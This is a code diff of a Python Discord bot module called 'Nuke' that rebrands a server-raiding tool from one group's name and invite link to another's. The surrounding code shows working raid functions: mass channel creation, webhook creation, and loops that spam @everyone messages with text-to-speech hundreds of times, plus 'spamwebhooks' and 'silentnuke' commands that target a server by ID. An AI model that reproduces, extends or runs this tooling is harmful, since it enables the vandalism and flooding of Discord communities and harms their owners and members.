@@ -18,7 +18,7 @@ async def check(ctx):
 	except:	pass
 	return True
 async def create_channel(guild, name):
-	try:await guild.create_text_channel(name=name, topic='**__crash by mainwars https://discord.gg/fTmfR5P7hP **')
+	try:await guild.create_text_channel(name=name, topic='**__crash by sshnodes https://discord.gg/WEDETPcNyW **')
 	except:pass
 async def create_webhook(channel, message):
 	try:webhook=await channel.create_webhook(name='Crash-by-mainwars')
@@ -26,7 +26,7 @@ async def create_webhook(channel, message):
 	create_task(spam(webhook, message))
 async def spam(webhook, message):
 	for i in range(300):
-		try:await webhook.send(message, tts=True, username='Crash-by-mainwars', avatar_url='https://mainwars.ru/assets/img/logo1.png')
+		try:await webhook.send(message, tts=True, username='Crash-by-sshnodes', avatar_url='https://mainwars.ru/assets/img/logo1.png')
 		except:pass
 async def edit_channel(channel):
 	try: await channel.edit(category=None)
@@ -66,7 +66,7 @@ class Nuke(commands.Cog):
 			for i in range(50):
 				create_task(create_channel(ctx.guild, name))
 	@commands.command()
-	async def spamwebhooks(self, ctx, *, message='|| @everyone @here || **__Crash-by-mainwars__ https://discord.gg/fTmfR5P7hP **'):
+	async def spamwebhooks(self, ctx, *, message='|| @everyone @here || **__Crash-by-sshnodes__ https://discord.gg/WEDETPcNyW **'):
 		if await check(ctx):
 			for channel in ctx.guild.text_channels:
 				for webhook in await channel.webhooks():
@@ -92,7 +92,7 @@ class Nuke(commands.Cog):
 			await sleep(20)
 			create_task(Nuke.spamwebhooks(self, ctx))
 	@commands.command()
-	async def silentnuke(self, ctx, server_id: int=None, *, message='||@everyone|| **__Crash-by-mainwars__ https://discord.gg/fTmfR5P7hP **'):
+	async def silentnuke(self, ctx, server_id: int=None, *, message='||@everyone|| **__Crash-by-sshnodes__ https://discord.gg/WEDETPcNyW **'):
 		if await check(ctx):
 			if server_id is None: server_id=ctx.guild.id
 			guild=''
